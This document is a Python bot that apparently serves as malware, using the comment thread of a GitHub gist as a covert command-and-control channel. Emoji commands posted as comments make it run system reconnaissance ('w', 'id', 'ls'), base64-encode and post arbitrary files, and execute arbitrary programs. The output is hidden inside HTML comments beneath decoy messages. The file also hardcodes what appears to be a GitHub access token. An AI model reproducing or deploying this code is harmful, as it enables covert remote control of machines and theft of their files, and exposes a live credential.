import requests as rq
import random
from datetime import datetime, timedelta
import time
import json
import subprocess

ACCESS_TOKEN = "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"
URL = "https://api.github.com/gists/d3639f5c1e928cf7b6570929a075eb4c/comments"
timestamp = datetime.utcnow()

# 👋 --> heartbeat from controller
# 👀 --> heartbeat back
# 🫵 --> id
# 🤓 --> ls
# 🥳 --> w
# 🤯 --> copy
# 😵‍💫 --> exec

print("Input bot name: ")
NAME = input()

headers = {
    "Accept": "application/vnd.github+json",
    "Authorization": "Bearer "+ACCESS_TOKEN
}

def post(body):
    r = rq.post(URL, headers=headers, data=json.dumps(body))
    #print(r)
    return r.json()

initMessage = "Hi my name is " + NAME + " 👀"
data = {
    "body": initMessage
}
#r = rq.post(URL, headers=headers, data=json.dumps(data))
#print(r)
commentId = post(data)["id"]
print("my id: " + str(commentId))

greetings = ["Hello", "Hi"]
idx = 0
while True:
    x = rq.get(URL, headers={"Authorization": "Bearer "+ACCESS_TOKEN})
    print(timestamp)
    if x.status_code == 200:
        x = x.json()
        print("----------------------------------------------------")
        for comment in x:
            body = comment["body"]
            #from GMT0 to GMT+1
            dt = datetime.strptime(comment["updated_at"], '%Y-%m-%dT%H:%M:%SZ')
            #print(timestamp)
            #print(comment["updated_at"] + " | " + body)
            if timestamp < dt: #new comment
                print("new comment: " + str(comment["id"]) + " | " + comment["updated_at"] + " | " + body)
                if "👋" in body:
                    print("heartbeat")
                    data = {
                        "body": greetings[idx] + " my name is " + NAME + " 👀"
                    }
                    r = rq.patch(URL+"/"+str(commentId), headers=headers, data=json.dumps(data))
                    #print(r)
                    if idx == 1:
                        idx = 0
                    else:
                        idx = 1
                elif "🥳" in body: #w
                    print("w")
                    res = subprocess.run(["w"], stdout=subprocess.PIPE).stdout.decode("utf-8")
                    post({"body": "I found one. <!-- " + NAME + ":\n" + res + " -->"})
                elif "🫵" in body: #id
                    print("id")
                    res = subprocess.run(["id"], stdout=subprocess.PIPE).stdout.decode("utf-8")
                    post({"body": "The ability to speak does not make you intelligent. <!-- " + NAME + ":\n" + res + " -->"})
                elif "🤓" in body: #ls
                    print("ls")
                    start = body.find("<!--")+5
                    end = body.find("-->")-1
                    path = body[start:end]
                    res = subprocess.run(["ls", path], stdout=subprocess.PIPE).stdout.decode("utf-8")
                    post({"body": "Polo! <!-- " + NAME + ":\n" + "ls " + path + "\n" + res + " -->"})
                elif "🤯" in body: #copy
                    print("copy")
                    start = body.find("<!--")+5
                    end = body.find("-->")-1
                    path = body[start:end]
                    res = subprocess.run(["base64", path], stdout=subprocess.PIPE).stdout.decode("utf-8")
                    post({"body": "As you wish. <!-- " + path + "\n" + res + " -->"})
                elif "😵‍💫" in body:
                    print("exec")
                    start = body.find("<!--")+5
                    end = body.find("-->")-1
                    path = body[start:end]
                    res = subprocess.run([path], stdout=subprocess.PIPE).stdout.decode("utf-8")
                    post({"body": "Kill it if you have to. <!-- " + path + "\n" + res + " -->"})
    else:
        print(x.json())
    timestamp = datetime.utcnow()
    #print("sleeping...")
    time.sleep(10)
    #time.sleep(random.randint(30, 60))
